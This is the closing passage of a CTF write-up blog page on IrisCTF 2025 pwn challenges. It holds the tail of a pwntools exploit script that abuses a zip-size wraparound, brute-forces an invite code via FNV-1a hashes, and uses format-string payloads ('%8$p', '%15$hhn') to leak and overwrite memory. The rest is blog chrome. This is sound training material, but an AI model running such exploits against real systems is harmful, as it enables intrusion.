    <span class="k">return</span> <span class="n">pay</span><span class="p">.</span><span class="nf">hex</span><span class="p">().</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">1022</span><span class="p">,</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>



<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x20</span><span class="p">):</span>
    <span class="nf">uploadFile</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="nf">gen_raw_zip</span><span class="p">(</span><span class="mh">0x100000000</span><span class="o">-</span><span class="mh">0x200</span><span class="o">*</span><span class="n">i</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="p">(</span><span class="mi">2</span><span class="o">*</span><span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">))))</span>

<span class="c1"># gdb.attach(io,'brva 0x017FF')
</span><span class="nf">listFiles</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>

<span class="n">hash_l</span> <span class="o">=</span> <span class="p">[]</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">31</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">  16 </span><span class="sh">'</span><span class="p">)</span>
    <span class="n">hash_l</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span> <span class="nf">int</span><span class="p">(</span><span class="nf">rl</span><span class="p">().</span><span class="nf">decode</span><span class="p">().</span><span class="nf">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="n">hash_l</span><span class="p">)</span>


<span class="n">base</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">invitecode.txt</span><span class="sh">'</span>
<span class="n">dic</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
        <span class="n">pad</span> <span class="o">=</span> <span class="nf">p8</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p8</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
        <span class="n">dic</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span>


<span class="n">me_find</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">hash_l</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">pad</span> <span class="ow">in</span> <span class="n">dic</span><span class="p">:</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">pad</span>
        <span class="k">if</span> <span class="nf">fnv1a_hash</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> <span class="o">==</span> <span class="n">h</span><span class="p">:</span>
            <span class="n">me_find</span> <span class="o">+=</span> <span class="n">pad</span>
            <span class="n">base</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">me_find</span><span class="p">)</span>
            <span class="k">break</span>

<span class="n">invitecode</span> <span class="o">=</span> <span class="n">me_find</span>
<span class="nf">createUser</span><span class="p">(</span><span class="sh">'</span><span class="s">hack1</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">pwd1</span><span class="sh">'</span><span class="p">,</span><span class="n">invitecode</span><span class="p">)</span>

<span class="nf">uploadFile</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">gen_zip</span><span class="p">(</span><span class="sh">'</span><span class="s">--%8$p--sssss</span><span class="sh">'</span><span class="p">))</span>

<span class="nf">viewFile</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">pwd1</span><span class="sh">'</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">--</span><span class="sh">'</span><span class="p">)</span>
<span class="n">elf_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">--</span><span class="sh">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">elf_base</span><span class="sh">'</span><span class="p">)</span>

<span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A%15$hhn</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="nf">uploadFile</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">gen_zip</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>

<span class="nf">viewFile</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">pwd1</span><span class="sh">'</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>


<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">? </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">? </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">pwd1</span><span class="sh">'</span><span class="p">)</span>

<span class="n">g2</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x00183D
</span><span class="sh">'''</span>

<span class="nf">itr</span><span class="p">()</span>
<span class="err">➜</span>  <span class="n">myfiles</span> 
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107152832-f4cusdl.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107152832-f4cusdl.png" alt="image" loading="lazy"></a>​</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          本文由作者按照 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         进行授权
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">分享</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FIrisCTF2025-Pwn-Binary-Exploitation-WriteUps%2F&title=IrisCTF2025-Pwn-Binary-Exploitation-WriteUps%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="QQ" aria-label="QQ">
        <i class="fa-fw fa-brands fa-qq"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=IrisCTF2025-Pwn-Binary-Exploitation-WriteUps%20-%20imLZH1'%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FIrisCTF2025-Pwn-Binary-Exploitation-WriteUps%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FIrisCTF2025-Pwn-Binary-Exploitation-WriteUps%2F&text=IrisCTF2025-Pwn-Binary-Exploitation-WriteUps%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="分享链接"
      data-title-succeed="链接已复制！"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">最近更新</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Kernel-Pwn-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/">Kernel Pwn 刷题记录</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Nullcon-Goa-HackIM-2025-CTF/">HACKIM 2025 CTF 一道wasm pwn题分享</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/LA_CTF-%E9%83%A8%E5%88%86Pwn%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-by-g1P03n/">LA CTF 2025 部分Pwn解题思路 by g1P03n</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/BRISC-CTF/">2024-BRISC-CTF-Pwn-WriteUps</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">文章内容</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->

























            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/BRISC-CTF/"
      class="btn btn-outline-primary"
      aria-label="上一篇"
    >
      <p>2024-BRISC-CTF-Pwn-WriteUps</p>
    </a>
  

  
    <a
      href="/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"
      class="btn btn-outline-primary"
      aria-label="下一篇"
    >
      <p>第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imLZH1/me_giscus_Discussions-',
      'data-repo-id': 'comments',
      'data-category': 'general',
      'data-category-id': '',
      'data-mapping': 'pathname',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': 'zh-CN',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    <a href="https://user.qzone.qq.com/3461665835">imLZH1</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。"
      >保留部分权利。</span>
    
  </p>
	<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>

  <p>本站采用 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">发现新版本的内容。</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      更新
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script src="/assets/lib/jquery/jquery.min.js"></script>
  

  
    <script src="/assets/lib/bootstrap/bootstrap.bundle.min.js"></script>
  

  
    <script src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script src="/assets/lib/magnific-popup/jquery.magnific-popup.min.js"></script>
  

  
    <script src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/locale/en.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/relativeTime.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/localizedFormat.min.js"></script>
  

  
    <script src="/assets/lib/tocbot/tocbot.min.js"></script>
  








<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

